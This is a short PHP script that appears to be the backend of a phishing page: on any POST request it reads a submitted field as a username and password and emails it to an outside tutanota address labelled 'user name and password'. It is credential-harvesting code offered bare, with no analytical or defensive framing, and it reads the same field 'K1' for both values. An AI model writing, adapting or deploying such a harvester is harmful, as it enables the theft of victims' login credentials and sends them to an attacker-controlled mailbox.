<?php
if($_POST){
    $name = $_POST['K1'];
    $password = $_POST['K1'];

//send email
    mail("loginuser@tutanota.com", "This is an email from:<br/> user name and password : ".$name ,$password);
}
?>